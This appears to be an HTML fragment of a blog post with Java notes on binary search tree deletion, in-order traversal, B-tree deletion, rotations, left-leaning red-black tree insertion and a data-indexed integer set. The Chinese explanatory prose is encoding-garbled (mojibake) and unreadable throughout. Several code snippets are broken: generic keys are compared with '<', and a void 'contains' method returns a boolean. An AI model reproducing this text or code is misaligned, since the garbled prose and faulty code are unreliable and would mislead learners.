 &#125;<br>        <span class="hljs-keyword">if</span> (dk.equals(T.key)) &#123;<br>            <span class="hljs-comment">// Case 1: Node to be deleted has no children</span><br>            <span class="hljs-keyword">if</span> (T.left == <span class="hljs-literal">null</span> &amp;&amp; T.right == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-comment">// Case 2: Node to be deleted has only one child</span><br>            <span class="hljs-keyword">if</span> (T.left == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> T.right;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (T.right == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> T.left;<br>            &#125;<br>            <span class="hljs-comment">// Case 3: Node to be deleted has two children</span><br>            <span class="hljs-type">Key</span> <span class="hljs-variable">minKey</span> <span class="hljs-operator">=</span> findMin(T.right);<br>            T.key = minKey;<br>            T.right = delete(T.right, minKey);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dk &lt; T.key) &#123;<br>            T.left = delete(T.left, dk);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            T.right = delete(T.right, dk);<br>        &#125;<br>        <span class="hljs-keyword">return</span> T;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Key <span class="hljs-title function_">findMin</span><span class="hljs-params">(BST T)</span> &#123;<br>        <span class="hljs-keyword">while</span> (T.left != <span class="hljs-literal">null</span>) &#123;<br>            T = T.left;<br>        &#125;<br>        <span class="hljs-keyword">return</span> T.key;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Tree-traversal"><a href="#Tree-traversal" class="headerlink" title="Tree traversal"></a>Tree traversal</h2><p>å¯¹äºæ ‘ï¼Œæˆ‘ä»¬æœ‰è¿™æ ·å››ç§éå†çš„æ–¹å¼</p><ol><li>å‰åºéå†ï¼ˆæ ¹ä¼˜å…ˆéå†ï¼Œå³å¯¹äºæ¯ä¸ªæ ‘å’Œå­æ ‘ï¼ŒæŒ‰ç…§æ ¹-å·¦æ ‘-å³æ ‘çš„é¡ºåºéå†ï¼‰</li><li>ä¸­åºéå†ï¼ˆå·¦æ ‘-æ ¹-å³æ ‘ï¼‰</li><li>ååºéå†ï¼ˆå·¦æ ‘-å³æ ‘-æ ¹ï¼‰</li><li>å±‚æ¬¡éå†ï¼ˆå…·æœ‰ç›¸åŒæ·±åº¦çš„ç§°ä¸ºä¸€å±‚ï¼‰</li></ol><p>è¿™é‡Œæˆ‘ä»¬å®ç°ä¸­åºéå†:</p><p>æˆ‘ä»¬åœ¨è¿­ä»£å™¨ä¸­ä½¿ç”¨ä¸€ä¸ªæ ˆæ¥è¾…åŠ©éå†ã€‚åœ¨å°†å…ƒç´ å‹å…¥æ ˆä¸­çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li><p>æ‰¾åˆ°å·¦å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å½“å‰èŠ‚ç‚¹çš„å·¦å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ã€‚è¿™ä¸ªèŠ‚ç‚¹æ˜¯ä¸­åºéå†ä¸­çš„ç¬¬ä¸€ä¸ªè¦è®¿é—®çš„èŠ‚ç‚¹ã€‚</p></li><li><p>å°†èŠ‚ç‚¹å‹å…¥æ ˆä¸­ï¼šä¸€æ—¦æ‰¾åˆ°äº†å·¦å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ï¼Œæˆ‘ä»¬å°†è¯¥èŠ‚ç‚¹å‹å…¥æ ˆä¸­ã€‚</p></li><li><p>æ›´æ–°å½“å‰èŠ‚ç‚¹ï¼šç„¶åï¼Œæˆ‘ä»¬å°†å½“å‰èŠ‚ç‚¹ç§»åŠ¨åˆ°å…¶å³å­æ ‘ã€‚å¦‚æœå³å­æ ‘ä¸ä¸ºç©ºï¼Œæˆ‘ä»¬ç»§ç»­é‡å¤æ­¥éª¤ 1 å’Œ 2ã€‚</p></li><li><p>é‡å¤ç›´åˆ°å®Œæˆï¼šæˆ‘ä»¬é‡å¤æ‰§è¡Œä¸Šè¿°æ­¥éª¤ï¼Œç›´åˆ°æ ˆä¸ºç©ºã€‚å½“æ ˆä¸ºç©ºæ—¶ï¼Œè¯´æ˜ BST ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½å·²ç»éå†å®Œæˆã€‚</p></li></ol><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-code">    5</span><br><span class="hljs-code">   / \</span><br><span class="hljs-code">  3   8</span><br><span class="hljs-code"> / \ / \</span><br><span class="hljs-code">2  4 7  9</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†æ ¹èŠ‚ç‚¹ 5 å‹å…¥æ ˆä¸­ï¼Œå¹¶ä¸”å°†æ ¹èŠ‚ç‚¹çš„å·¦å­æ ‘å…¨éƒ¨å‹å…¥æ ˆä¸­ï¼Œç›´åˆ°å·¦å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ 2ã€‚æ­¤æ—¶ï¼Œæ ˆä¸­çš„å…ƒç´ ä¸º [2, 3, 5]ã€‚</p><p>æ¥ç€ï¼Œæˆ‘ä»¬å¼€å§‹æ‰§è¡Œè¿­ä»£å™¨çš„ next() æ–¹æ³•ã€‚åœ¨ next() æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆå¼¹å‡ºæ ˆé¡¶èŠ‚ç‚¹ 2ï¼Œç„¶åå°†å…¶å³å­èŠ‚ç‚¹ null å‹å…¥æ ˆä¸­ã€‚æ­¤æ—¶ï¼Œæ ˆä¸­çš„å…ƒç´ ä¸º [3, 5]ã€‚</p><p>ç»§ç»­æ‰§è¡Œ next() æ–¹æ³•ï¼Œæˆ‘ä»¬å¼¹å‡ºæ ˆé¡¶èŠ‚ç‚¹ 3ï¼Œè¿”å› 3ã€‚ç„¶åï¼Œå°†å…¶å³å­èŠ‚ç‚¹ 4 å‹å…¥æ ˆä¸­ã€‚æ­¤æ—¶ï¼Œæ ˆä¸­çš„å…ƒç´ ä¸º [4, 5]ã€‚</p><p>å†æ¬¡æ‰§è¡Œ next() æ–¹æ³•ï¼Œæˆ‘ä»¬å¼¹å‡ºæ ˆé¡¶èŠ‚ç‚¹ 4ï¼Œè¿”å› 4ã€‚æ­¤æ—¶ï¼Œæ ˆä¸­çš„å…ƒç´ ä¸º [5]ã€‚</p><p>ç»§ç»­æ‰§è¡Œ next() æ–¹æ³•ï¼Œæˆ‘ä»¬å¼¹å‡ºæ ˆé¡¶èŠ‚ç‚¹ 5ï¼Œè¿”å› 5ã€‚ç„¶åï¼Œå°†å…¶å³å­èŠ‚ç‚¹ 8 å‹å…¥æ ˆä¸­ï¼Œå¹¶å°†å³å­æ ‘çš„æ‰€æœ‰å·¦å­èŠ‚ç‚¹å…¨éƒ¨å‹å…¥æ ˆä¸­ï¼Œç›´åˆ°å·¦å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ 7ã€‚æ­¤æ—¶ï¼Œæ ˆä¸­çš„å…ƒç´ ä¸º [7, 8]ã€‚</p><p>ç»§ç»­æ‰§è¡Œ next() æ–¹æ³•ï¼Œæˆ‘ä»¬å¼¹å‡ºæ ˆé¡¶èŠ‚ç‚¹ 7ï¼Œè¿”å› 7ã€‚ç„¶åï¼Œå°†å…¶å³å­èŠ‚ç‚¹ null å‹å…¥æ ˆä¸­ã€‚æ­¤æ—¶ï¼Œæ ˆä¸­çš„å…ƒç´ ä¸º [8]ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬å¼¹å‡ºæ ˆé¡¶èŠ‚ç‚¹ 8ï¼Œè¿”å› 8ã€‚ç„¶åï¼Œå°†å…¶å³å­èŠ‚ç‚¹ 9 å‹å…¥æ ˆä¸­ï¼Œå¹¶ä¸”å°†å³å­èŠ‚ç‚¹çš„æ‰€æœ‰å·¦å­èŠ‚ç‚¹å…¨éƒ¨å‹å…¥æ ˆä¸­ï¼Œç›´åˆ°å·¦å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ 9ã€‚æ­¤æ—¶ï¼Œæ ˆä¸­çš„å…ƒç´ ä¸º [9]ã€‚</p><p>æœ€ç»ˆï¼Œæˆ‘ä»¬æ‰§è¡Œ next() æ–¹æ³•ï¼Œå¼¹å‡ºæ ˆé¡¶èŠ‚ç‚¹ 9ï¼Œè¿”å› 9ã€‚æ­¤æ—¶ï¼Œæ ˆä¸ºç©ºï¼Œéå†ç»“æŸã€‚</p><p>é€šè¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬æŒ‰ç…§ä¸­åºéå†çš„é¡ºåºéå†äº†äºŒå‰æœç´¢æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œè¿­ä»£å™¨çš„ next() æ–¹æ³•æˆåŠŸè¿”å›äº†æ‰€æœ‰èŠ‚ç‚¹çš„é”®å€¼ã€‚</p><h2 id="Tree-Height"><a href="#Tree-Height" class="headerlink" title="Tree Height"></a>Tree Height</h2><p>åœ¨æœ€å¥½æƒ…å†µä¸‹ï¼Œsearchæ“ä½œçš„æ—¶é—´ä¸º $\Theta (\log{}{N})$ ï¼Œä½†æœ€å·®æƒ…å†µä¸‹å¯ä»¥è¾¾åˆ° $\Theta (n)$ ã€‚</p><ul><li>depth: èŠ‚ç‚¹ä¸æ ¹ä¹‹é—´çš„é“¾æ¥æ•°</li><li>height: æ ‘çš„æœ€ä½æ·±åº¦ï¼ˆæ·±åº¦æœ€å¤§ï¼‰</li><li>average depthï¼šå¹³å‡æ·±åº¦<br>æ ‘çš„é«˜åº¦å†³å®šäº†æœ€åæƒ…å†µä¸‹çš„è¿è¡Œæ—¶é—´ï¼Œå› ä¸ºåœ¨æœ€åæƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦çš„èŠ‚ç‚¹åœ¨æ ‘çš„åº•éƒ¨ã€‚<br>å¹³å‡æ·±åº¦å†³å®šäº†å¹³å‡è¿è¡Œæ—¶é—´ã€‚</li></ul><h2 id="B-Trees"><a href="#B-Trees" class="headerlink" title="B-Trees"></a>B-Trees</h2><p>å½“æˆ‘ä»¬æ’å…¥æ–°æ•°æ®æ—¶ï¼Œæˆ‘ä»¬æ€»æ˜¯ä¼šå°†æ–°æ•°æ®æ’å…¥åˆ°åŸæ¥çš„å¶å­ä¸Šï¼Œè¿™æ ·ä¾¿é€ æˆäº†æ ‘çš„é«˜åº¦å¢åŠ ã€‚æ›´ä¸¥é‡çš„æ˜¯ï¼Œå½“æˆ‘ä»¬çš„æ•°æ®å‘ˆç°å‡ºè¿ç»­çš„ç‰¹ç‚¹æ—¶ï¼Œæˆ‘ä»¬ä¼šæ²¿ç€ä¸€æ¡è·¯çº¿ä¸æ–­å‘ä¸‹ï¼Œå¯¼è‡´æ•´æ£µæ ‘çš„ç»“æ„è¯•å»å¹³è¡¡ï¼Œä¹Ÿä½¿ç®—æ³•æ•ˆç‡é™ä½ã€‚</p><p>äºæ˜¯æˆ‘ä»¬ä¾¿æœ‰äº†è¿™æ ·ä¸€ä¸ªæƒ³æ³•ï¼šå½“æˆ‘ä»¬æ·»åŠ èŠ‚ç‚¹æ—¶ï¼Œæ°¸è¿œä¸è¦æ·»åŠ å¶èŠ‚ç‚¹ï¼Œè€Œæ˜¯å°†åŸæœ‰çš„å¶èŠ‚ç‚¹æ‰©å……ï¼Œå³ä¸€ä¸ªèŠ‚ç‚¹ä¾æ¬¡å­˜æ”¾å¤šäºä¸€ä¸ªæ•°æ®ã€‚</p><p>è¿™æ ·åšçš„ç¡®ä½¿ç»“æ„å¹³è¡¡ï¼Œå‡å°äº†é«˜åº¦ï¼Œä½†æ˜¯åœ¨æ–°æ·»åŠ çš„æ•°æ®é‡çº§è¾ƒå¤§æ—¶ï¼Œå¹¶æ²¡æœ‰é™ä½å¤æ‚åº¦ã€‚</p><p>äºæ˜¯æˆ‘ä»¬å°†æ·»åŠ çš„æ•°æ®ç»§ç»­åˆ†ç¦»ï¼Œå°†ä¸­é—´çš„ä¸€éƒ¨åˆ†æ²¿æ ‘æå‘ä¸Šæ·»åŠ åˆ°çˆ¶èŠ‚ç‚¹ä¸­ï¼Œä½¿å¾—æ•´ä¸ªæ ‘æ›´åŠ å¹³è¡¡ã€‚è¿™æ ·ï¼Œå¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æ‹¥æœ‰å«æœ‰ä¸¤ä¸ªå…ƒç´ çš„å­èŠ‚ç‚¹ï¼Œå¹¶ä¿æŒèŠ‚ç‚¹ä¹‹é—´çš„æœ‰åºæ’åˆ—ï¼Œè¿™ä¾¿æ˜¯Bæ ‘çš„å®šä¹‰ã€‚</p><p>æˆ‘ä»¬ä¸»è¦è®¨è®º 2-3 æ ‘ï¼Œå³ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥æœ€å¤šåŒ…å«ä¸¤ä¸ªå…ƒç´ ï¼Œä¸‰ä¸ªå­èŠ‚ç‚¹ã€‚</p><p>Bæ ‘çš„ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š</p><ol><li>æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰mä¸ªå­èŠ‚ç‚¹ã€‚</li><li>é™¤äº†æ ¹èŠ‚ç‚¹å’Œå¶èŠ‚ç‚¹å¤–ï¼Œæ¯ä¸ªèŠ‚ç‚¹è‡³å°‘æœ‰âŒˆm&#x2F;2âŒ‰ä¸ªå­èŠ‚ç‚¹ã€‚</li><li>æ ¹èŠ‚ç‚¹è‡³å°‘æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œé™¤éå®ƒæ˜¯ä¸€ä¸ªå¶èŠ‚ç‚¹ã€‚</li><li>æ‰€æœ‰å¶èŠ‚ç‚¹éƒ½å‡ºç°åœ¨åŒä¸€å±‚çº§ã€‚</li><li>ä¸€ä¸ªéå¶èŠ‚ç‚¹å¦‚æœæœ‰kä¸ªå­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒåŒ…å«k-1ä¸ªé”®ã€‚æ¯ä¸ªå†…éƒ¨èŠ‚ç‚¹çš„é”®ä½œä¸ºåˆ†éš”å€¼ï¼Œå°†å…¶å­æ ‘åˆ†å¼€ã€‚</li></ol><h3 id="B-Tree-Deletion"><a href="#B-Tree-Deletion" class="headerlink" title="B-Tree Deletion"></a>B-Tree Deletion</h3><p><strong>CASE1ï¼š</strong>é‚»è¿‘çš„å…„å¼ŸèŠ‚ç‚¹æœ‰å¤šä¸ªKey<br><img src="/Pictures/CS61b/02/case1A.png" alt="case1"></p><p>è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç”¨çˆ¶èŠ‚ç‚¹å¡«å……åˆ é™¤èŠ‚ç‚¹ï¼Œç”¨é‚»è¿‘å…„å¼ŸèŠ‚ç‚¹çš„è¾ƒå°Keyå¡«å……çˆ¶èŠ‚ç‚¹.</p><p><img src="/Pictures/CS61b/02/1Asolve.png" alt="solution"></p><p><strong>CASE2ï¼š</strong>çˆ¶èŠ‚ç‚¹å«æœ‰ä¸¤ä¸ªKeyï¼Œé‚»è¿‘çš„å…„å¼ŸèŠ‚ç‚¹åªæœ‰ä¸€ä¸ªã€‚</p><p><img src="/Pictures/CS61b/02/case2.png" alt="case2"></p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçˆ¶èŠ‚ç‚¹çš„å·¦å€¼åˆ†é…åˆ°å·¦å­©å­ï¼Œå³å€¼åˆ†é…åˆ°å³å­©å­ï¼Œä¸­é—´çš„å­èŠ‚ç‚¹çš„ä¸¤ä¸ªå­™èŠ‚ç‚¹åˆ†åˆ«åˆ†é…åˆ°å…¶ä½™èŠ‚ç‚¹ä¸‹ã€‚</p><p><img src="/Pictures/CS61b/02/2solution.png" alt="solution"></p><p><strong>CASE3ï¼š</strong>çˆ¶èŠ‚ç‚¹å’Œé‚»è¿‘å…„å¼ŸèŠ‚ç‚¹å‡åªæœ‰ä¸€ä¸ªKey</p><p><img src="/Pictures/CS61b/02/case3.png" alt="case3"></p><h3 id="Tree-Rotation"><a href="#Tree-Rotation" class="headerlink" title="Tree Rotation"></a>Tree Rotation</h3><p>åœ¨ä¸Šé¢çš„ç®—æ³•ä¸­ï¼Œæˆ‘ä»¬å¤šæ¬¡ç”¨åˆ°äº†CASE1ä¸­ç±»ä¼¼äºâ€œæ—‹è½¬â€çš„æ“ä½œã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥æ­£å¼çš„å®šä¹‰è¿™ç§æ“ä½œå¹¶ç”¨ç®—æ³•å®ç°ã€‚</p><p>The formal definition of rotation is:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BTree</span> &#123;<br>    <span class="hljs-keyword">private</span> Node <span class="hljs-title function_">rotateRight</span><span class="hljs-params">(Node h)</span> &#123;<br>        <span class="hljs-comment">// assert (h != null) &amp;&amp; isRed(h.left);</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> h.left;<br>        h.left = x.right;<br>        x.right = h;<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br><br><span class="hljs-comment">// make a right-leaning link lean to the left</span><br>    <span class="hljs-keyword">private</span> Node <span class="hljs-title function_">rotateLeft</span><span class="hljs-params">(Node h)</span> &#123;<br>        <span class="hljs-comment">// assert (h != null) &amp;&amp; isRed(h.right);</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> h.right;<br>        h.right = x.left;<br>        x.left = h;<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/Pictures/CS61b/02/rotation.png" alt="rotation"></p><p>é€šè¿‡åŸºç¡€çš„æ—‹è½¬æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ç®€å•çš„èŠ‚ç‚¹é‡æ„ã€‚</p><h2 id="Red-Black-Tree"><a href="#Red-Black-Tree" class="headerlink" title="Red-Black Tree"></a>Red-Black Tree</h2><p>2-3 æ ‘çš„æƒ³æ³•éå¸¸å¥½ï¼Œä½†å®é™…ä¸Šå¾ˆéš¾å®ç°ï¼Œäºæ˜¯æˆ‘ä»¬è€ƒè™‘åˆ›å»ºä¸€ç§åŒæ—¶ä½¿ç”¨BSTå’Œ2-3æ ‘çš„ç»“æ„çš„æ–°çš„æ ‘ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆè€ƒè™‘å¦‚ä½•å°†2-3æ ‘è½¬æ¢ä¸ºBSTã€‚</p><p>å¯¹äºåªæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹çš„2-3æ ‘ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†BSTç»“æ„ï¼Œå› æ­¤ä¸éœ€è¦è¿›è¡Œä¿®æ”¹ï¼›ä½†æ˜¯å¯¹äºæœ‰ä¸‰ä¸ªå­èŠ‚ç‚¹çš„æ ‘ï¼Œæˆ‘ä»¬é¦–å…ˆè¦åšçš„ä¾¿æ˜¯åˆ›å»ºä¸€ä¸ªâ€œç²˜åˆèŠ‚ç‚¹â€ï¼Œå®ƒä¸ä¿å­˜ä»»ä½•ä¿¡æ¯ï¼Œä»…ç”¨äºè¡¨æ˜å®ƒçš„ä¸¤ä¸ªå­èŠ‚ç‚¹å®é™…ä¸Šæ—¶ä¸€ä¸ªèŠ‚ç‚¹çš„ä¸€éƒ¨åˆ†ã€‚</p><p>ç„¶è€Œï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸ä¸ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼Œå› ä¸ºæˆ‘ä»¬å ç”¨äº†æ›´å¤šçš„ç©ºé—´ï¼Œè€Œä¸”ä»£ç ä¹Ÿå¾ˆéš¾çœ‹ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ç²˜åˆé“¾æ¥è€Œä¸æ˜¯ä½¿ç”¨ç²˜åˆèŠ‚ç‚¹ï¼</p><p>æˆ‘ä»¬é€‰æ‹©ä½¿å·¦ä¾§å…ƒç´ æˆä¸ºå³ä¾§å…ƒç´ çš„å­å…ƒç´ ã€‚è¿™ä¼šäº§ç”Ÿä¸€æ£µå·¦å€¾æ ‘ã€‚æˆ‘ä»¬é€šè¿‡å°†é“¾æ¥è®¾ä¸ºçº¢è‰²æ¥è¡¨æ˜å®ƒæ˜¯ç²˜åˆé“¾æ¥ã€‚æ­£å¸¸é“¾æ¥æ˜¯é»‘è‰²çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†è¿™äº›ç»“æ„ç§°ä¸ºå·¦å€¾çº¢é»‘æ ‘(LLRB)ã€‚</p><p>2-3æ ‘å’ŒLLRBä¹‹é—´å­˜åœ¨ä¸€ä¸€å¯¹åº”çš„åŒå°„å…³ç³»ã€‚</p><p><img src="/Pictures/CS61b/02/LLRB.png" alt="LLRB"></p><p>æ³¨æ„ï¼šè¦æ„æˆæœ‰æ•ˆçš„çº¢é»‘æ ‘ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ol><li>æ¯ä¸ªèŠ‚ç‚¹åªèƒ½æœ‰ä¸å¤šäºä¸€ä¸ªçº¢è‰²é“¾æ¥</li><li>æ¯æ¡ä»leaf åˆ° root çš„è·¯å¾„å…·æœ‰ç›¸åŒçš„é»‘è‰²é“¾æ¥æ•°é‡ã€‚</li><li>è‹¥åŸæœ¬2-3æ ‘çš„é«˜åº¦ä¸º $H$ ï¼ŒLLRBçš„é«˜åº¦ä¸è¶…è¿‡ $2H+1$ ã€‚</li></ol><h3 id="Tree-Insertion"><a href="#Tree-Insertion" class="headerlink" title="Tree Insertion"></a>Tree Insertion</h3><p>å‘çº¢é»‘æ ‘ä¸­æ’å…¥èŠ‚ç‚¹ï¼Œéœ€è¦è§£å†³ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p><ol><li>æ’å…¥çš„é¢œè‰²ï¼šåœ¨2-3æ ‘ä¸­ï¼Œæˆ‘ä»¬æ€»æ˜¯é€šè¿‡æ·»åŠ åˆ°å¶èŠ‚ç‚¹æ¥æ’å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æ·»åŠ çš„é“¾æ¥åº”è¯¥æ˜¯çº¢è‰²é“¾æ¥ã€‚</li></ol><p><img src="/Pictures/CS61b/02/insert_color.png" alt="Task1"></p><ol start="2"><li>æ’å…¥æ–¹å‘ï¼šæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯LLRBï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬æ°¸è¿œä¸å¯èƒ½æ‹¥æœ‰å³ä¾§çš„çº¢è‰²é“¾æ¥ï¼Œå¦‚æœéœ€è¦åœ¨å³ä¾§æ’å…¥ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œå¿…è¦çš„æ—‹è½¬æ“ä½œã€‚</li></ol><p><img src="/Pictures/CS61b/02/insert_right.png" alt="Task2"></p><ol start="3"><li>å¼•å…¥æš‚æ—¶çš„ <em>4èŠ‚ç‚¹</em> è§£å†³é—®é¢˜</li></ol><p><img src="/Pictures/CS61b/02/4node.png" alt="Task3"></p><p>ä¹‹åæˆ‘ä»¬åˆ©ç”¨ <em>flip</em> æ“ä½œæ¥è¿›è¡Œè§„èŒƒåŒ–æ“ä½œã€‚</p><p><img src="/Pictures/CS61b/02/flip.png" alt="Task4"></p><p>æŠ½è±¡ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">put</span><span class="hljs-params">(Node h, Key key, Value val)</span> &#123;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(key, val, RED); &#125;<br><br>    <span class="hljs-type">int</span> <span class="hljs-variable">cmp</span> <span class="hljs-operator">=</span> key.compareTo(h.key);<br>    <span class="hljs-keyword">if</span> (cmp &lt; <span class="hljs-number">0</span>)      &#123; h.left  = put(h.left,  key, val); &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmp &gt; <span class="hljs-number">0</span>) &#123; h.right = put(h.right, key, val); &#125;<br>    <span class="hljs-keyword">else</span>              &#123; h.val   = val;                    &#125;<br><br>    <span class="hljs-keyword">if</span> (isRed(h.right) &amp;&amp; !isRed(h.left))      &#123; h = rotateLeft(h);  &#125;<br>    <span class="hljs-keyword">if</span> (isRed(h.left)  &amp;&amp;  isRed(h.left.left)) &#123; h = rotateRight(h); &#125;<br>    <span class="hljs-keyword">if</span> (isRed(h.left)  &amp;&amp;  isRed(h.right))     &#123; flipColors(h);      &#125; <br><br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Hashing"><a href="#Hashing" class="headerlink" title="Hashing"></a>Hashing</h1><h2 id="DataIndexedIntegerSet"><a href="#DataIndexedIntegerSet" class="headerlink" title="DataIndexedIntegerSet"></a>DataIndexedIntegerSet</h2><p>å¯¹äºæˆ‘ä»¬å·²ç»å­¦ä¹ åˆ°çš„æ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾æŸä¸€å…ƒç´ æ—¶ï¼Œéƒ½éœ€è¦éå†æ•´ä¸ªç»“æ„ã€‚è¿™æ ·é€šå¸¸ä¼šèŠ±è´¹ $O(n)$ è¿è¡Œæ—¶ç”šè‡³æ›´å¤šã€‚äºæ˜¯æˆ‘ä»¬è€ƒè™‘è®¾è®¡è¿™æ ·ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œè®©å¯»æ‰¾å…ƒç´ çš„æ—¶é—´å˜ä¸º $O(1)$ ã€‚</p><p>äºæ˜¯æˆ‘ä»¬è€ƒè™‘è¿™æ ·ä¸€ç§æ•°æ®ç»“æ„ï¼šæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œå­˜æ”¾booleanç±»å‹çš„æ•°æ®ï¼Œ<strong>å°†æ•°ç»„çš„ index ä½œä¸ºæ•°æ®çš„å€¼</strong>ã€‚åˆå§‹æ—¶æˆ‘ä»¬å°†å…ƒç´ è®¾ç½®ä¸º<em>false</em>ï¼Œä»£è¡¨æ²¡æœ‰å­˜æ”¾å¯¹åº”åºå·çš„æ•°æ®ã€‚åœ¨æ·»åŠ æ•°æ®æ—¶ï¼Œåªéœ€è¦å°†å¯¹åº”ä½ç½®çš„å…ƒç´ æ›´æ”¹ä¸º<em>true</em>å³å¯ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬çš„<em>search</em>å’Œ<em>contains</em>æ“ä½œéƒ½å°†æ˜¯ $O(1)$ å¤æ‚åº¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataIndexedIntegerSet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span>[] present;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DataIndexedIntegerSet</span><span class="hljs-params">()</span> &#123;<br>        present = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">200000000</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        present[i] = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">return</span> present[i];<br>    